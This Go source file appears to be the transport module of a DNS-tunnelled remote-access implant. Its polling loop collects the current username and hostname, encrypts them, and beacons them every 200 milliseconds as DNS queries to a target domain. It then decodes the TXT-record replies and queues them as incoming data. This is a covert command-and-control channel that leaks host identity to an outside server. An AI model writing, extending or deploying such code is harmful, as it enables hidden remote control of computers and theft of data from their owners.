package transport

import (
	"chacomm/crypto"
	"chacomm/protocol"
	"fmt"
	"github.com/theodesp/blockingQueues"
	"log"
	"os"
	"os/user"
	"strings"
	"time"
)

var packetQueue, _ = blockingQueues.NewArrayBlockingQueue(1024)

func  pollRead(stream dnsStream){
	for {
		time.Sleep(200 * time.Millisecond)
		poll(stream)
	}
}

func poll(stream dnsStream){
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}
	userinfo, err := user.Current()
	if err == nil {
		hostname = fmt.Sprintf("%s@%s", userinfo.Username, hostname)
	}

	nonce, identifier := crypto.Seal([]byte(hostname), stream.encryptionKey)
	pollQuery := &chacomm.Message{
		Clientguid: stream.clientGuid,
		Packet:&chacomm.Message_Pollquery{
			Pollquery: &chacomm.PollQuery{
				Nonce: nonce[:],
				Identifier: identifier,
			},
		},
	}

	pollPacket, err := dnsMarshal(pollQuery, true)

	if err != nil {
		log.Fatal("Poll marshaling fatal error : %v\n", err)
	}

	answers, err := sendDNSQuery([]byte(pollPacket), stream.targetDomain)
	if err != nil {
		log.Printf("Could not get answer : %v\n", err)
		return
	}
	if len(answers) > 0 {
		// do something with t.Txt
		packetTxt := strings.Join(answers, "")
		if packetTxt == "-" {
			return
		}
		output, complete := Decode(packetTxt, stream)
		if complete {
			log.Printf("Final data: %s\n", output)
			packetQueue.Put(output)
		} else {
			/* More data available. Get it !*/
			poll(stream)
		}

	}
}